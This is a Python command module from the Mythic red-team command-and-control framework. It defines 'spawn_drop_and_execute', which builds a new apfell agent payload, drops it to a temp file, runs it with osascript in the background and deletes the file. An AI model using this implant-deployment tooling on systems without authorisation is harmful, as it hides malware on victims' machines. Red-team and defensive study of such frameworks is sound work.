from mythic_payloadtype_container.MythicCommandBase import *
import sys
from mythic_payloadtype_container.MythicRPC import *
import asyncio


class SpawnDropAndExecuteArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "template": CommandParameter(
                name="template",
                type=ParameterType.Payload,
                description="apfell agent to use as template to generate a new payload",
                supported_agents=["apfell"],
            )
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                raise ValueError("Missing JSON arguments")
        else:
            raise ValueError("Missing arguments")


class SpawnDropAndExecuteCommand(CommandBase):
    cmd = "spawn_drop_and_execute"
    needs_admin = False
    help_cmd = "spawn_drop_and_execute"
    description = "Generate a new payload, drop it to a temp location, execute it with osascript as a background process, and then delete the file. Automatically reports back the temp file it created"
    version = 1
    author = "@its_a_feature_"
    attackmapping = []
    argument_class = SpawnDropAndExecuteArguments

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        try:
            gen_resp = await MythicRPC().execute("create_payload_from_uuid", task_id=task.id,
                                                 payload_uuid=task.args.get_arg("template"))
            if gen_resp.status == MythicStatus.Success:
                # we know a payload is building, now we want it
                while True:
                    resp = await MythicRPC().execute("get_payload", payload_uuid=gen_resp.response["uuid"])
                    if resp.status == MythicStatus.Success:
                        if resp.response["build_phase"] == "success":
                            task.args.add_arg("template", resp.response["file"]["agent_file_id"])
                            task.display_params = f"new Apfell payload ({resp.response['uuid']}) with description {resp.response['tag']}"
                            break
                        elif resp.response["build_phase"] == "error":
                            raise Exception(
                                "Failed to build new payload: " + str(resp.error)
                            )
                        else:
                            await asyncio.sleep(1)
                    if resp.status == MythicStatus.Error:
                        raise Exception("Failed to get information about new payload:\n" + resp.error)
            else:
                raise Exception("Failed to generate new payload:\n" + gen_resp.error)
        except Exception as e:
            raise Exception("Error trying to call RPC:\n" + str(e))
        return task

    async def process_response(self, response: AgentResponse):
        pass
